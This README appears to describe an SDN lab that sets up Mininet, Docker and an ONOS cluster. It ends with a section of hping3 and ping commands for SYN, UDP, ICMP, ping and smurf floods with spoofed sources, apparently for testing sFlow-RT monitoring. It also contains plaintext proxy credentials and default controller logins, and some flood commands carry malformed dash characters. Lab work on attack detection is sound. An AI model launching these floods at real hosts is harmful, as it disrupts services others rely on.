## Installing Mininet
* sudo apt-get install mininet

## Installing Docker
* sudo apt-get purge docker docker-engine docker.io
* sudo apt-get update
* sudo apt-get install apt-transport-https ca-certificates curl software-properties-common
* curl -fsSL https://download.docker.com/linux/ubuntu/gpg | sudo apt-key add -
* sudo apt-key fingerprint 0EBFCD88
* Verify that you now have the key with the fingerprint.
* sudo add-apt-repository "deb [arch=amd64] https://download.docker.com/linux/ubuntu $(lsb_release -cs) stable"
* sudo apt-get update
* sudo apt-get install docker-ce

## Configuring Proxy in docker
* mkdir -p /etc/systemd/system/docker.service.d
* sudo gedit /etc/systemd/system/docker.service.d/http-proxy.conf
* Enter following in file:<br>
```
[Service]<br>
Environment="HTTP_PROXY=http://edcguest:edcguest@172.31.52.51:3128/"
```
* sudo gedit /etc/systemd/system/docker.service.d/https-proxy.conf
* Enter following in file:<br>
```
[Service]<br>
Environment="HTTPS_PROXY=https://edcguest:edcguest@172.31.52.51:3128/"
```
* sudo systemctl daemon-reload
* sudo systemctl restart docker
* open new terminal and verify that proxy is set by typing <br> *sudo systemctl show --property=Environment docker*
* docker run hello-world
## Downloading onos
* docker pull onosproject/onos:1.11.1
* sudo docker images (verify)
## Installing other requirements
* sudo apt-get purge python-pip
* wget https://bootstrap.pypa.io/get-pip.py
* python get-pip.py
* sudo pip install networkx
* sudo pip install paramiko

## Running onos instances
* sudo docker run -t -d --name onos1 onosproject/onos:1.11.1<br>
 * sudo docker run -t -d --name onos2 onosproject/onos:1.11.1<br>
* sudo docker run -t -d --name onos3 onosproject/onos:1.11.1<br>
## Docker IPs
* 172.17.0.2
* 172.17.0.3 and so on (based on number of instances)
## SSH inside the ONOS
* ssh -p 8101 karaf@172.17.0.2
* password : **karaf**
## Activating apps inside ONOS
* app activate org.onosproject.openflow
* app activate org.onosproject.fwd
## Accessing the GUI 
* Go to http://172.17.0.2:8181/onos/ui/index.html
* username : **onos**
* password : **rocks**
## Wiping out ONOS
* wipe-out please (clears the nodes)
## Stopping already running instances
* docker stop onos1 onos2 onos3
## Removing old containers
* docker rm onos1 onos2 onos3
## Forming cluster
* ./onos-form-cluster -u karaf -p karaf 172.17.0.2 172.17.0.3 172.17.0.4
## using standard mininet topologies
* sudo mn --controller=remote,ip=172.17.0.2,port=6653 --topo=[ linear|minimal|reversed|single|torus|tree ],10 
## cleaning mininet
* sudo mn -c
## DDOS Attacks
+ ### SYN Flood
```
sudo hping3 --rand-source –S –L 0 –p 80 <target IP>
```
+ ### UDP Flood
```
sudo hping3 --rand-source -–udp -p 53 <target IP> --flood
```
+ ### ICMP Flood
```
sudo hping3 --icmp --rand-source <target IP> --flood
```
+ ### Ping Flood
```
sudo ping -f -s 65500 <Target IP>
```
+ ### Smurf Attack
```
sudo hping3 -1 --flood -a <Victim IP> <Broadcast IP>
```
### SFlow-RT
sFlow-RT is a network monitoring tool delivering real-time visibility to Software
Defned Networking (SDN).It gives us all the real time analytics about the current
state of out network.You can download it from [here](https://sflow-rt.com/). 
## Other contributors
* [Chaitanya kumar](https://github.com/ckumar2398)
* [Aditya Choudary](https://github.com/adityachd123)
* [Kapil Dev](https://github.com/kapilDev1)
* [Ayushi Sharma](https://www.google.com)
